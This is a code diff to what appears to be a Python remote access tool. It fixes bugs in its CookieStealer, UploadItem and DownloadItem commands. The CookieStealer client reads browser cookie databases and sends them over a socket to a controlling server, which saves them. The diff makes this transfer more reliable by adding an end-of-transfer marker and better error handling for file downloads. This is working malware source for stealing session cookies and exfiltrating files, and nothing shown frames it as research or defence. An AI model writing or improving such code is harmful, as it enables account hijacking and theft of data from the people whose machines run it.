@@ -808,10 +808,14 @@ class CookieStealer(DoubleCommand):
             try:
                 with open(path, "rb") as cookies_file:
                     cookies_sql = cookies_file.read()
-                    send_string(sock, browser_name)
-                    send_bytes(sock, cookies_sql)
+                send_string(sock, browser_name)
+                send_bytes(sock, cookies_sql)
             except OSError:
                 continue
+        try:
+            send_bytes(sock, b"EXIT")
+        except OSError:
+            return
 
     @staticmethod
     def server_side(client: Client, params: tuple) -> CommandResult:
@@ -838,6 +842,8 @@ class CookieStealer(DoubleCommand):
                 filename = recieve_string(client.socket).translate(
                     str.maketrans({char: "" for char in '\\/*?<>:|"'})
                 )
+                if filename == b"EXIT":
+                    break
                 cookies_db = recieve_bytes(client.socket)
                 try:
                     with open(f"{target_folder}/{filename}.db", "wb") as cookies_db_fd:
@@ -852,7 +858,7 @@ class CookieStealer(DoubleCommand):
                 break
 
         print(
-            f"Downloaded {len(os.listdir(target_folder))} cookie databases to {target_folder}"
+            f"Downloaded {len(os.listdir(target_folder))} cookie databases to '{target_folder}'"
         )
         return CommandResult(DoubleCommandResult.success, target_folder)
 
@@ -905,13 +911,10 @@ class UploadItem(DoubleCommand):
                     out_file.write(file_contents)
             except PermissionError:
                 success_indicator = b"p"
-                return
             except FileNotFoundError:
                 success_indicator = b"f"
-                return
             except OSError:
                 success_indicator = b"?"
-                return
         elif item_type == b"d":
             try:
                 with zipfile.ZipFile(io.BytesIO(file_contents), "r") as zip_file:
@@ -954,7 +957,7 @@ class UploadItem(DoubleCommand):
             else:
                 client.socket.sendall(b"d")
         except OSError:
-            print(f"Failed to send {item_type} to client")
+            print(f"Failed to send item type to client")
             return CommandResult(DoubleCommandResult.conn_error)
 
         try:
@@ -1095,10 +1098,39 @@ class DownloadItem(DoubleCommand):
             if item_type == b"n":
                 print("Item not found on client")
                 return CommandResult(DoubleCommandResult.failure)
-            file_contents = recieve_bytes(client.socket)
         except OSError:
             print("Failed to recieve item from client")
             return CommandResult(DoubleCommandResult.conn_error)
+
+        word_item_type = "file" if item_type == b"f" else "folder"
+
+        try:
+            success_indicator = client.socket.recv(1)
+        except OSError:
+            print("Client did not send a success indicator")
+            return CommandResult(DoubleCommandResult.conn_error)
+
+        match success_indicator:
+            case b"y":
+                pass
+            case b"p":
+                print(f"Client does not have permission to read the {word_item_type}")
+                return CommandResult(DoubleCommandResult.failure)
+            case b"o":
+                print(
+                    f"There was a miscellaneous OS-error whilst reading the {word_item_type}"
+                )
+                return CommandResult(DoubleCommandResult.failure)
+            case b"e":
+                print(
+                    f"There was a miscellaneous error whilst reading the {word_item_type}"
+                )
+                return CommandResult(DoubleCommandResult.failure)
+            case _:
+                print("Client sent an invalid success indicator")
+                return CommandResult(DoubleCommandResult.failure)
+
+        file_contents = recieve_bytes(client.socket)
 
         if item_type == b"f":
             try:
@@ -1106,7 +1138,7 @@ class DownloadItem(DoubleCommand):
                     out_file.write(file_contents)
             except OSError as err:
                 print(
-                    f"There was an operating system  error when writing the file (error code: {err.errno})"
+                    f"There was an operating system error when writing the file (error code: {err.errno})"
                 )
                 return CommandResult(DoubleCommandResult.failure)
         else:
@@ -1122,7 +1154,7 @@ class DownloadItem(DoubleCommand):
                 print(f"Invalid ZIP file sent from client")
                 return CommandResult(DoubleCommandResult.failure)
 
-        print(f"Recieved {'file' if item_type == 'f' else 'folder'} successfully")
+        print(f"Recieved {word_item_type} successfully")
         return CommandResult(DoubleCommandResult.success)
 
 
